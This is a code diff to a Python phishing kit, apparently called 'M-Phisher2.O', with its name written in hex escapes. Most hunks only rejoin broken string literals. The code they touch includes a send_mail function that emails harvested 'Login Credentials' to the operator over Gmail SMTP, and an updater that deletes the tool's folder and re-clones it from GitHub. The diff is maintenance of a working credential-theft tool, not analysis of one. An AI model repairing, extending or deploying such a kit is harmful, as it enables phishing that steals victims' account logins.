@@ -460,7 +460,6 @@ def show_file_data(file):
         Panel(
             text.strip(),
             title="[bold green]\x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F[/][cyan] Data[/]", 
-        [/][cyan] Data[/]", 
             title_align="left",
             border_style="blue",
         )
@@ -678,8 +677,7 @@ def internet(url="https://api.github.com", timeout=5):
 # Send mail by smtp library
 def send_mail(msg):
     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F
- Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
@@ -1058,15 +1056,12 @@ def updater():
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/LUCIFERGREYHAT1/m-phisher2.O/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
-        print(f"{info}\x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F
-     has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
-        upask=input(f"\n{ask}Do you want to update \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F
-    ?[y/n] > {green}")
+        print(f"{info}\x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
+        upask=input(f"\n{ask}Do you want to update \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F?[y/n] > {green}")
         if upask=="y":
             print(nc)
             shell(f"cd .. && rm -rf m-phisher2.O m-phisher2.O && git clone {repo_url}")
-            sprint(f"\n{success}\x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F
-         has been updated successfully!! Please restart terminal!")
+            sprint(f"\n{success}\x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F has been updated successfully!! Please restart terminal!")
             if (changelog != "404: Not Found"):
                 sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
             exit()
@@ -1099,8 +1094,7 @@ def requirements():
         except Exception as e:
             print(f"{error}{str(e)}")
         if termux and retry == 1:
-            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F
-        !\n")
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x4D\x2D\x50\x68\x69\x73\x68\x65\x72\x32\x2E\x4F!\n")
             sleep(2)
             pexit()
 
